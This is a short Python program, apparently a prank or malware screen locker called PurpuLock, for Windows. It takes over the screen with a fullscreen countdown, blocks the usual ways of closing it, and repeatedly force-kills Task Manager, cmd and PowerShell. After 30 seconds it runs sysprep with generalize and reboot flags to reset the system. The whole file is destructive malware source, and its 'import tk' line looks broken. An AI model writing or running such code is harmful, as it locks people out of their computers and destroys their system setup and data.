import tk as tk
import subprocess
import time
import threading
import os
import urllib.request
import tempfile
import winsound
import ctypes

TIMER_LIMIT = 30
AUDIO_URL = "https://www.dropbox.com/scl/fi/ittcghhd0zgi18qdz2fu0/freddy-countdown.mp3?rlkey=jhfle50xj8cgvlz9bycqcu97b&st=360cfdy7&dl=1"

class PurpuLock:
    def __init__(self):
        self.root = tk.Tk()
        self.root.attributes('-fullscreen', True)
        self.root.attributes('-topmost', True)
        self.root.configure(bg='white')
        self.root.protocol("WM_DELETE_WINDOW", self.prevent_close)
        self.root.bind("<Escape>", self.prevent_close)
        self.root.bind("<Alt-F4>", self.prevent_close)
        
        self.label = tk.Label(self.root, text="0:30", font=("Arial", 120), bg="white", fg="black")
        self.label.pack(expand=True)
        
        self.remaining = TIMER_LIMIT
        self.temp_audio = os.path.join(tempfile.gettempdir(), "lock_sound.wav")
        self.running = True

    def prevent_close(self, event=None):
        pass

    def kill_tasks(self):
        forbidden = ["taskmgr.exe", "cmd.exe", "powershell.exe", "powershell_ise.exe", "pwsh.exe"]
        while self.running:
            for process in forbidden:
                subprocess.run(f"taskkill /F /IM {process}", shell=True, capture_output=True)
            time.sleep(0.5)

    def download_audio(self):
        try:
            urllib.request.urlretrieve(AUDIO_URL, self.temp_audio)
        except:
            pass

    def start_sequence(self):
        self.download_audio()
        
        if os.path.exists(self.temp_audio):
            threading.Thread(target=lambda: winsound.PlaySound(self.temp_audio, winsound.SND_FILENAME), daemon=True).start()
        
        self.update_timer()

    def update_timer(self):
        if self.remaining > 0:
            mins, secs = divmod(self.remaining, 60)
            self.label.config(text=f"{mins}:{secs:02d}")
            self.remaining -= 1
            self.root.after(1000, self.update_timer)
        else:
            self.execute_wipe()

    def execute_wipe(self):
        self.running = False
        try:
            subprocess.run("C:\\Windows\\System32\\Sysprep\\sysprep.exe /oobe /reboot /generalize /quiet", shell=True)
        except:
            os.system("shutdown /r /t 0 /f")

if __name__ == "__main__":
    app = PurpuLock()
    
    threading.Thread(target=app.kill_tasks, daemon=True).start()
    threading.Thread(target=app.start_sequence, daemon=True).start()
    
    app.root.mainloop()
